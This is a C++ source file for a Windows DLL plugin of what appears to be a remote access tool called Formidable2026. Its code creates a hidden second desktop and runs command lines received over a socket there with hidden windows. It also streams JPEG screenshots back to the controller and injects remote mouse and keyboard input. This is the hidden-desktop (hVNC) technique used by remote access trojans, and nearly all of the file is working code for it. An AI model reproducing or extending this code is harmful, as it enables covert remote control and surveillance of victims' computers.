/**
 * Formidable2026 - BackgroundScreen Module (DLL)
 * 实现后台隔离桌面、静默操作、进程管理与屏幕监控
 * Encoding: UTF-8 BOM
 */
#ifndef _WINSOCKAPI_
#define _WINSOCKAPI_
#endif
#include <windows.h>
#include <objidl.h> // Required for GDI+ IStream
#include <winsock2.h>
#include <vector>
#include <string>
#include <thread>
#include <gdiplus.h>
#include <d3d11.h>
#include <dxgi1_2.h>
#include <atlbase.h>
#include "../../Common/Config.h"

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "d3d11.lib")
#pragma comment(lib, "dxgi.lib")

using namespace Formidable;
using namespace Gdiplus;

// DXGI 捕获类实现 (基于用户提供的方案)
class DXGICapture {
public:
    DXGICapture() : m_device(nullptr), m_context(nullptr), m_duplication(nullptr), m_stagingTexture(nullptr), m_width(0), m_height(0) {}
    ~DXGICapture() { Cleanup(); }

    bool Initialize() {
        Cleanup();
        D3D_FEATURE_LEVEL featureLevels[] = { D3D_FEATURE_LEVEL_11_0, D3D_FEATURE_LEVEL_10_1, D3D_FEATURE_LEVEL_10_0 };
        D3D_FEATURE_LEVEL featureLevel;
        HRESULT hr = D3D11CreateDevice(nullptr, D3D_DRIVER_TYPE_HARDWARE, nullptr, 0, featureLevels, ARRAYSIZE(featureLevels), D3D11_SDK_VERSION, &m_device, &featureLevel, &m_context);
        if (FAILED(hr)) return false;

        CComPtr<IDXGIDevice> dxgiDevice;
        if (FAILED(m_device->QueryInterface(__uuidof(IDXGIDevice), (void**)&dxgiDevice))) return false;
        CComPtr<IDXGIAdapter> dxgiAdapter;
        if (FAILED(dxgiDevice->GetParent(__uuidof(IDXGIAdapter), (void**)&dxgiAdapter))) return false;
        CComPtr<IDXGIOutput> dxgiOutput;
        if (FAILED(dxgiAdapter->EnumOutputs(0, &dxgiOutput))) return false;
        CComPtr<IDXGIOutput1> dxgiOutput1;
        if (FAILED(dxgiOutput->QueryInterface(__uuidof(IDXGIOutput1), (void**)&dxgiOutput1))) return false;

        hr = dxgiOutput1->DuplicateOutput(m_device, &m_duplication);
        if (FAILED(hr)) return false;

        DXGI_OUTPUT_DESC outputDesc;
        dxgiOutput->GetDesc(&outputDesc);
        m_width = outputDesc.DesktopCoordinates.right - outputDesc.DesktopCoordinates.left;
        m_height = outputDesc.DesktopCoordinates.bottom - outputDesc.DesktopCoordinates.top;
        return true;
    }

    bool CaptureFrame(std::vector<uint8_t>& outPixels, int& outWidth, int& outHeight) {
        if (!m_duplication) return false;
        CComPtr<IDXGIResource> desktopResource;
        DXGI_OUTDUPL_FRAME_INFO frameInfo;
        HRESULT hr = m_duplication->AcquireNextFrame(100, &frameInfo, &desktopResource);
        if (hr == DXGI_ERROR_WAIT_TIMEOUT) return false;
        
        // 如果返回 DXGI_ERROR_ACCESS_LOST，说明桌面切换了（例如进入了 UAC 或锁屏）
        if (hr == DXGI_ERROR_ACCESS_LOST) {
            Cleanup();
            Initialize();
            return false;
        }
        
        if (FAILED(hr)) return false;

        CComPtr<ID3D11Texture2D> desktopTexture;
        hr = desktopResource->QueryInterface(__uuidof(ID3D11Texture2D), (void**)&desktopTexture);
        if (FAILED(hr)) { m_duplication->ReleaseFrame(); return false; }

        D3D11_TEXTURE2D_DESC desc;
        desktopTexture->GetDesc(&desc);
        if (!m_stagingTexture || m_width != desc.Width || m_height != desc.Height) {
            if (m_stagingTexture) m_stagingTexture->Release();
            D3D11_TEXTURE2D_DESC sdesc = desc;
            sdesc.Usage = D3D11_USAGE_STAGING;
            sdesc.CPUAccessFlags = D3D11_CPU_ACCESS_READ;
            sdesc.BindFlags = 0;
            sdesc.MiscFlags = 0;
            sdesc.MipLevels = 1;
            sdesc.ArraySize = 1;
            m_device->CreateTexture2D(&sdesc, nullptr, &m_stagingTexture);
            m_width = desc.Width; m_height = desc.Height;
        }

        m_context->CopyResource(m_stagingTexture, desktopTexture);
        m_duplication->ReleaseFrame();

        D3D11_MAPPED_SUBRESOURCE mapped;
        if (SUCCEEDED(m_context->Map(m_stagingTexture, 0, D3D11_MAP_READ, 0, &mapped))) {
            outWidth = m_width; outHeight = m_height;
            outPixels.resize(m_width * m_height * 4);
            uint8_t* src = (uint8_t*)mapped.pData;
            uint8_t* dst = outPixels.data();
            for (int y = 0; y < m_height; y++) {
                memcpy(dst, src, m_width * 4);
                src += mapped.RowPitch;
                dst += m_width * 4;
            }
            m_context->Unmap(m_stagingTexture, 0);
            return true;
        }
        return false;
    }

    void Cleanup() {
        if (m_stagingTexture) { m_stagingTexture->Release(); m_stagingTexture = nullptr; }
        if (m_duplication) { m_duplication->Release(); m_duplication = nullptr; }
        if (m_context) { m_context->Release(); m_context = nullptr; }
        if (m_device) { m_device->Release(); m_device = nullptr; }
    }

private:
    ID3D11Device* m_device;
    ID3D11DeviceContext* m_context;
    IDXGIOutputDuplication* m_duplication;
    ID3D11Texture2D* m_stagingTexture;
    int m_width, m_height;
};

#define IDM_DESKTOP_CAPTURE_GDI   2310
#define IDM_DESKTOP_CAPTURE_DXGI  2311

// 全局变量
SOCKET g_socket = INVALID_SOCKET;
HDESK g_hBackgroundDesktop = NULL;
bool g_captureRunning = false;
std::thread g_captureThread;
ULONG_PTR g_gdiplusToken;
int g_currentMonitorIndex = 0;
int g_captureMethod = 0; // 0=GDI, 1=DXGI
DXGICapture* g_dxgiCapture = nullptr;

// 辅助函数：发送数据
bool SendResponse(SOCKET s, uint32_t cmd, uint32_t arg1, uint32_t arg2, const void* data, int len) {
    PkgHeader header;
    memcpy(header.flag, "FRMD26?", 7);
    header.originLen = sizeof(CommandPkg) - 1 + len;
    header.totalLen = sizeof(PkgHeader) + header.originLen;
    
    std::vector<char> buffer(header.totalLen);
    memcpy(buffer.data(), &header, sizeof(PkgHeader));
    
    CommandPkg* pkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
    pkg->cmd = cmd;
    pkg->arg1 = arg1;
    pkg->arg2 = arg2;
    if (len > 0 && data) {
        memcpy(pkg->data, data, len);
    }
    
    const char* pData = buffer.data();
    int remaining = (int)buffer.size();
    while (remaining > 0) {
        int sent = send(s, pData, remaining, 0);
        if (sent == SOCKET_ERROR || sent == 0) return false;
        pData += sent;
        remaining -= sent;
    }
    return true;
}

// 屏幕信息结构
struct MonitorInfo {
    RECT rect;
    bool isPrimary;
};

// 枚举显示器回调
BOOL CALLBACK MonitorEnumProc(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lprcMonitor, LPARAM dwData) {
    std::vector<MonitorInfo>* monitors = (std::vector<MonitorInfo>*)dwData;
    MONITORINFO mi = { sizeof(mi) };
    if (GetMonitorInfoW(hMonitor, &mi)) {
        MonitorInfo info;
        info.rect = mi.rcMonitor;
        info.isPrimary = (mi.dwFlags & MONITORINFOF_PRIMARY) != 0;
        monitors->push_back(info);
    }
    return TRUE;
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;
    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

// 后台桌面屏幕捕获线程
void BackgroundCaptureThread(SOCKET s) {
    // 切换当前线程到后台桌面
    if (g_hBackgroundDesktop) {
        SetThreadDesktop(g_hBackgroundDesktop);
    }

    // 初始化 GDI+
    GdiplusStartupInput gsi;
    GdiplusStartup(&g_gdiplusToken, &gsi, NULL);
    CLSID clsidJpeg;
    GetEncoderClsid(L"image/jpeg", &clsidJpeg);

    std::vector<uint8_t> dxgiBuffer;

    while (g_captureRunning) {
        int width = 0, height = 0;
        int left = 0, top = 0;
        HBITMAP hBitmap = NULL;
        Bitmap* bmp = NULL;

        if (g_captureMethod == 1) { // DXGI Mode
            if (!g_dxgiCapture) {
                g_dxgiCapture = new DXGICapture();
                if (!g_dxgiCapture->Initialize()) {
                    delete g_dxgiCapture;
                    g_dxgiCapture = nullptr;
                    g_captureMethod = 0; // Fallback to GDI
                }
            }

            if (g_dxgiCapture) {
                if (g_dxgiCapture->CaptureFrame(dxgiBuffer, width, height)) {
                    // DXGI 捕获成功，创建 GDI+ Bitmap
                    // 注意：DXGI 默认是 BGRA
                    bmp = new Bitmap(width, height, width * 4, PixelFormat32bppARGB, dxgiBuffer.data());
                } else {
                    // 如果 DXGI 捕获失败（例如静止），我们稍等一下
                    std::this_thread::sleep_for(std::chrono::milliseconds(50));
                    continue;
                }
            }
        }

        if (g_captureMethod == 0 || !bmp) { // GDI Mode or Fallback
            std::vector<MonitorInfo> monitors;
            EnumDisplayMonitors(NULL, NULL, MonitorEnumProc, (LPARAM)&monitors);

            if (monitors.empty()) {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                continue;
            }

            if (g_currentMonitorIndex < 0 || g_currentMonitorIndex >= (int)monitors.size()) {
                g_currentMonitorIndex = 0;
            }

            MonitorInfo currentMonitor = monitors[g_currentMonitorIndex];
            width = currentMonitor.rect.right - currentMonitor.rect.left;
            height = currentMonitor.rect.bottom - currentMonitor.rect.top;
            left = currentMonitor.rect.left;
            top = currentMonitor.rect.top;

            HDC hScreenDC = GetDC(NULL);
            if (!hScreenDC) {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                continue;
            }
            
            HDC hMemDC = CreateCompatibleDC(hScreenDC);
            hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
            HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemDC, hBitmap);

            BitBlt(hMemDC, 0, 0, width, height, hScreenDC, left, top, SRCCOPY);
            
            bmp = new Bitmap(hBitmap, NULL);

            SelectObject(hMemDC, hOldBitmap);
            DeleteDC(hMemDC);
            ReleaseDC(NULL, hScreenDC);
        }

        if (bmp) {
            // 转换为 JPEG 发送
            IStream* pStream = NULL;
            if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) == S_OK) {
                EncoderParameters encoderParams;
                encoderParams.Count = 1;
                encoderParams.Parameter[0].Guid = EncoderQuality;
                encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
                encoderParams.Parameter[0].NumberOfValues = 1;
                ULONG quality = 50;
                encoderParams.Parameter[0].Value = &quality;

                if (bmp->Save(pStream, &clsidJpeg, &encoderParams) == Ok) {
                    HGLOBAL hGlobal = NULL;
                    if (GetHGlobalFromStream(pStream, &hGlobal) == S_OK) {
                        void* pData = GlobalLock(hGlobal);
                        SIZE_T size = GlobalSize(hGlobal);
                        if (pData && size > 0) {
                            SendResponse(s, CMD_BACKGROUND_SCREEN_CAPTURE, (uint32_t)size, 0, pData, (int)size);
                        }
                        GlobalUnlock(hGlobal);
                    }
                }
                pStream->Release();
            }
            delete bmp;
        }

        if (hBitmap) DeleteObject(hBitmap);

        // DXGI 模式下帧率可以更高
        std::this_thread::sleep_for(std::chrono::milliseconds(g_captureMethod == 1 ? 30 : 200)); 
    }

    if (g_dxgiCapture) {
        delete g_dxgiCapture;
        g_dxgiCapture = nullptr;
    }
    GdiplusShutdown(g_gdiplusToken);
}

// 导出函数
extern "C" __declspec(dllexport) void WINAPI ModuleEntry(SOCKET s, CommandPkg* pkg) {
    g_socket = s;

    switch (pkg->cmd) {
        case CMD_BACKGROUND_CREATE: {
            if (!g_hBackgroundDesktop) {
                // 创建或打开后台桌面
                g_hBackgroundDesktop = CreateDesktopA("FormidableBackground", NULL, NULL, 0, GENERIC_ALL, NULL);
                if (!g_hBackgroundDesktop) {
                    g_hBackgroundDesktop = OpenDesktopA("FormidableBackground", 0, FALSE, GENERIC_ALL);
                }
            }
            
            std::string msg = g_hBackgroundDesktop ? "后台桌面已就绪" : "创建后台桌面失败";
            SendResponse(s, CMD_BACKGROUND_CREATE, (uint32_t)msg.size(), 0, msg.c_str(), (int)msg.size());
            
            // 自动开启屏幕捕获
            if (g_hBackgroundDesktop && !g_captureRunning) {
                g_captureRunning = true;
                if (g_captureThread.joinable()) g_captureThread.detach();
                g_captureThread = std::thread(BackgroundCaptureThread, s);
            }
            break;
        }

        case CMD_BACKGROUND_EXECUTE: {
            if (!g_hBackgroundDesktop) break;

            char* cmdLine = (char*)pkg->data;
            STARTUPINFOA si = { sizeof(si) };
            si.lpDesktop = (char*)"FormidableBackground"; // 指定在后台桌面运行
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE; // 默认隐藏窗口

            PROCESS_INFORMATION pi = { 0 };
            BOOL ok = CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
            
            std::string msg = ok ? "程序已在后台启动" : "后台启动程序失败";
            SendResponse(s, CMD_BACKGROUND_EXECUTE, (uint32_t)msg.size(), 0, msg.c_str(), (int)msg.size());
            
            if (ok) {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
            break;
        }

        case CMD_BACKGROUND_SCREEN_CONTROL: {
            if (!g_hBackgroundDesktop) break;
            
            // 如果 arg1=10/11，说明是切换采集模式指令 (为了兼容性放在这里处理)
            if (pkg->arg1 == 10) { // GDI
                g_captureMethod = 0;
                if (g_dxgiCapture) { delete g_dxgiCapture; g_dxgiCapture = nullptr; }
                break;
            } else if (pkg->arg1 == 11) { // DXGI
                g_captureMethod = 1;
                break;
            }

            // 正常控制逻辑
            HDESK hOldDesk = GetThreadDesktop(GetCurrentThreadId());
            SetThreadDesktop(g_hBackgroundDesktop);

            BackgroundCmdData* data = (BackgroundCmdData*)pkg->data;
            
            // 处理坐标映射 (考虑到多显示器)
            std::vector<MonitorInfo> monitors;
            EnumDisplayMonitors(NULL, NULL, MonitorEnumProc, (LPARAM)&monitors);
            int realX = data->x;
            int realY = data->y;
            
            if (!monitors.empty()) {
                if (g_currentMonitorIndex >= 0 && g_currentMonitorIndex < (int)monitors.size()) {
                    realX += monitors[g_currentMonitorIndex].rect.left;
                    realY += monitors[g_currentMonitorIndex].rect.top;
                }
            }

            switch (data->type) {
                case 0: // Mouse Move
                    SetCursorPos(realX, realY);
                    break;
                case 1: // Mouse Left Down
                    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                    break;
                case 2: // Mouse Left Up
                    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                    break;
                case 3: // Mouse Right Down
                    mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
                    break;
                case 4: // Mouse Right Up
                    mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
                    break;
                case 5: // Key Down
                    keybd_event((BYTE)data->arg1, 0, 0, 0);
                    break;
                case 6: // Key Up
                    keybd_event((BYTE)data->arg1, 0, KEYEVENTF_KEYUP, 0);
                    break;
            }

            SetThreadDesktop(hOldDesk);
            break;
        }

        case CMD_SWITCH_MONITOR: {
            std::vector<MonitorInfo> monitors;
            EnumDisplayMonitors(NULL, NULL, MonitorEnumProc, (LPARAM)&monitors);
            if (!monitors.empty()) {
                g_currentMonitorIndex = (g_currentMonitorIndex + 1) % (int)monitors.size();
                
                // 如果是 DXGI 模式，切换显示器需要重新初始化
                if (g_captureMethod == 1 && g_dxgiCapture) {
                    delete g_dxgiCapture;
                    g_dxgiCapture = nullptr;
                }

                std::string msg = "已切换到显示器 " + std::to_string(g_currentMonitorIndex + 1);
                SendResponse(s, CMD_SWITCH_MONITOR, (uint32_t)g_currentMonitorIndex, 0, msg.c_str(), (int)msg.size());
            }
            break;
        }

        case CMD_BACKGROUND_SWITCH_BACK: {
            // 停止捕获
            g_captureRunning = false;
            if (g_captureThread.joinable()) g_captureThread.join();
            
            if (g_hBackgroundDesktop) {
                CloseDesktop(g_hBackgroundDesktop);
                g_hBackgroundDesktop = NULL;
            }
            break;
        }
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            break;
        case DLL_PROCESS_DETACH:
            g_captureRunning = false;
            if (g_captureThread.joinable()) g_captureThread.detach();
            if (g_hBackgroundDesktop) CloseDesktop(g_hBackgroundDesktop);
            break;
    }
    return TRUE;
}
